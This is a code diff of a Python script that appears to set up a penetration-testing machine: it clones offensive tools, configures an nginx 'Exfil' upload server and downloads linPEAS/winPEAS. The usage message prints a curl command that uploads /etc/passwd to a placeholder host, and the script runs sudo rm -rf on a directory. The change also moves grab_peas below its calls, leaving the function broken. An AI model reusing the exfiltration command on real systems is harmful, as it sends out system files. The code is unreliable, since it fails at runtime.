@@ -33,21 +33,21 @@ GITHUBS = [
    'https://github.com/0v3rride/Enum4LinuxPy.git',
 	'https://github.com/21y4d/nmapAutomator.git',
 	'https://github.com/BishopFox/rmiscout.git',
-	'https://github.com/cnotin/SplunkWhisperer2',
+	'https://github.com/cnotin/SplunkWhisperer2.git',
 	'https://github.com/unode/firefox_decrypt.git',
 	'https://github.com/frohoff/ysoserial.git',
-	'https://github.com/GhostPack/Seatbelt',
+	'https://github.com/GhostPack/Seatbelt.git',
 	'https://github.com/HackPlayers/evil-winrm.git',
 	'https://github.com/n0b0dyCN/redis-rogue-server.git',
 	'https://github.com/nccgroup/vlan-hopping.git',
 	'https://github.com/NickstaDB/BaRMIe.git',
 	'https://github.com/samratashok/nishang.git',
-	'https://github.com/p3nt4/Invoke-SocksProxy',
+	'https://github.com/p3nt4/Invoke-SocksProxy.git',
 	'https://github.com/silent6trinity/pwnkit.git',
 	'https://github.com/rebootuser/LinEnum.git',
 	'https://github.com/RUB-NDS/PRET.git',
 	'https://github.com/SecureAuthCorp/Impacket.git',
-	'https://github.com/sosdave/KeyTabExtract',
+	'https://github.com/sosdave/KeyTabExtract.git',
 	'https://github.com/vulnersCom/nmap-vulners.git'
 ]
 
@@ -79,8 +79,8 @@ def nginx_config():
 	os.system("sudo systemctl restart nginx.service")
 	os.system("sudo rm /etc/nginx/sites-enabled/default")
 	# Usage
-	print(colored("NGINX has been setup. To test the upload, try:\n","green"))
-	print(colored("curl -T /etc/passwd http://<ip>:8443/Exfil/testfile.txt ; tail -n 1 /var/www/upload/Exfil/testfile.txt", "green"))
+	print(colored("NGINX has been setup. To test the upload, try:","green"))
+	print(colored("curl -T /etc/passwd http://<ip>:8443/Exfil/testfile.txt ; tail -n 1 /var/www/upload/Exfil/testfile.txt \n", "green"))
 
 
 def env_setup():
@@ -128,18 +128,20 @@ def peas_download():
 	linpeas_sh = 'https://github.com/carlospolop/PEASS-ng/releases/download/20221009/linpeas.sh'
 	winpeas_bat = 'https://github.com/carlospolop/PEASS-ng/releases/download/20221009/winPEAS.bat'
 	winpeas_exe = 'https://github.com/carlospolop/PEASS-ng/releases/download/20221009/winPEASany.exe'
-	def grab_peas():
-		os.mkdir(f"sudo /opt/PEAS")
-		os.system(f"sudo wget {linpeas_sh} -qO /opt/PEAS/linpeas.sh && chmod +x /opt/PEAS/linpeas.sh")
-		os.system(f"sudo wget {winpeas_bat} -qO /opt/PEAS/winpeas.bat")
-		os.system(f"sudo wget {winpeas_exe} -qO /opt/PEAS/winpeas.exe")
-	# For the time being - just scrub the PEAS directory and re-obtain
 	if os.path.exists("/opt/PEAS"):
 		#Lol, risky
 		os.system("sudo rm -rf /opt/PEAS")
 		grab_peas()
 	else:
 		grab_peas()
+
+	def grab_peas():
+		os.mkdir(f"sudo /opt/PEAS")
+		os.system(f"sudo wget {linpeas_sh} -qO /opt/PEAS/linpeas.sh && chmod +x /opt/PEAS/linpeas.sh")
+		os.system(f"sudo wget {winpeas_bat} -qO /opt/PEAS/winpeas.bat")
+		os.system(f"sudo wget {winpeas_exe} -qO /opt/PEAS/winpeas.exe")
+	# For the time being - just scrub the PEAS directory and re-obtain
+
 
 
 def shell_creation():
